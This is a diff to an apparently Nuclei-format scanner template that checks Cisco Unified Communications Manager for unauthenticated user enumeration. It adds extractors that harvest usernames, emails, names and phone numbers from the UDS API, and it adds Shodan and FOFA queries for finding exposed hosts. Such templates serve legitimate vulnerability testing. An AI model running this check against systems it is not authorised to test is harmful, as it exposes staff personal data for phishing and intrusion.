@@ -1,11 +1,36 @@
 http:
-- matchers:
+- extractors:
+  - name: usernames
+    type: xpath
+    xpath:
+    - /users/user/userName
+  - name: emails
+    type: xpath
+    xpath:
+    - /users/user/email
+  - name: full_names
+    type: xpath
+    xpath:
+    - concat(/users/user/firstName, ' ', /users/user/lastName)
+  - name: phone_numbers
+    type: xpath
+    xpath:
+    - /users/user/phoneNumber
+  - name: mobile_numbers
+    type: xpath
+    xpath:
+    - /users/user/mobileNumber
+  headers:
+    Accept: application/xml
+  matchers:
   - status:
     - 200
     type: status
   - condition: and
+    part: body
     type: word
     words:
+    - <users
     - <userName>
     - <lastName>
     - <phoneNumber>
@@ -20,12 +45,19 @@ http:
   - '{{BaseURL}}/cucm-uds/users'
 id: cucm-username-enumeration
 info:
-  author: manasmbellani
+  author: manasmbellani,Morgan Robertson
+  description: Cisco Unified Call Manager is vulnerable to username enumeration. This
+    template enumerates valid usernames and emails from the Cisco UCM UDS API.
   metadata:
-    max-request: 1
-  name: Cisco Unified Call Manager Username Enumeration
+    fofa-query: title="Unified Communications Self Care Portal"
+    product: unified_communications_manager
+    shodan-query: html:"/ucmuser/"
+    vendor: cisco
+    verified: true
+  name: Cisco Unified Communications Manager - User Enumeration
   reference:
+  - https://developer.cisco.com/site/user-data-services/develop-and-test/api-reference/#users
   - https://www.n00py.io/2022/01/unauthenticated-dumping-of-usernames-via-cisco-unified-call-manager-cucm/
   remediation: To mitigate this, enable Contact Search Authentication.
   severity: medium
-  tags: cisco,cucm,unauth,enum
+  tags: cisco,ucm,enum,users,xml,cucm,unauth,vuln
